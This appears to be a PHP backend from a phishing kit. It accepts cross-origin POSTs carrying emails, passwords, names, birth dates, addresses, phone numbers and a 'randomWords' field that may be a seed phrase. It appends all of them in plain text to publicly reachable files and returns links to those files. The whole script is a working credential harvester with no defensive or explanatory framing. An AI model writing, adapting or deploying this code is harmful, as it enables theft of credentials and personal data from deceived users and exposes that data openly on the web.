<?php

header('Access-Control-Allow-Methods: POST');
header('Access-Control-Max-Age: 1000');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
header('Access-Control-Allow-Origin: *');

$_POST = json_decode(file_get_contents('php://input'), true);

$birth = $_POST['birth'];
$city = $_POST['city'];
$email = $_POST['email'];
$index = $_POST['index'];
$name = $_POST['name'];
$password = $_POST['password'];
$phoneCode = $_POST['phoneCode'];
$phone = $_POST['phone'];
$randomWords = $_POST['randomWords'];
$address = $_POST['address'];
$surName = $_POST['surName'];

createFiles();

function createFiles()
{
    global $name, $birth, $city, $email, $address,$index, $password, $phoneCode, $phone,$randomWords,$surName;
    $filename = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'].'/';

    $fp = fopen('fullInfo.txt', 'a+');
    $text = "\r\n{\r\n\t'email': '$email',\r\n\t'pass': '$password',\r\n\t'name': '$name',\r\n\t'phoneCode': '$phoneCode',\r\n\t'surName': '$surName',\r\n\t'birth: '$birth',\r\n\t'randomWords': '$randomWords',\r\n\t'city': '$city',\r\n\t'address': '$address',\r\n\t'index': '$index',\r\n\t'phone': '$phone',\r\n},";
    fwrite($fp, $text);
    fclose($fp);

    $fp = fopen('emailInfo.txt', 'a+');
    $text = "\r\n{\r\n\t'email': '$email',\r\n\t'pass': '$password'\r\n},";
    fwrite($fp, $text);
    fclose($fp);

    $object = [
        'fullInfo'=>$filename.'fullInfo.txt',
        'emailInfo'=>$filename.'emailInfo.txt'
    ];

    echo json_encode($object);
}
